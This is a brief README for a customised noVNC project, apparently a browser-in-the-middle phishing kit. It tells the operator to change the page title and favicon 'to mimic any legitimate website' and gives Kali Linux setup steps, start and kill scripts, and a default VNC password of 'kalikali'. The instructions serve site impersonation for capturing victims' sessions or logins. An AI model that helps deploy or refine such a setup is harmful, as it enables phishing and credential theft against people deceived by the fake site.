Official project repository - https://github.com/novnc/noVNC

Our custom implementation of this project can be found in index.html
Change the title and favicon in index.html to mimic any legitimate website

Usage: sh startvnc.sh
Kill: sh killvnc.sh

Requirements:
- Kali Linux
- TigerVNC (Linux package)
- Run once using "vncserver" in a command prompt and set the default password to "kalikali" (no view-only password)
- Replace ~/.vnc/xstartup with the custom xstartup file found in the repo root folder
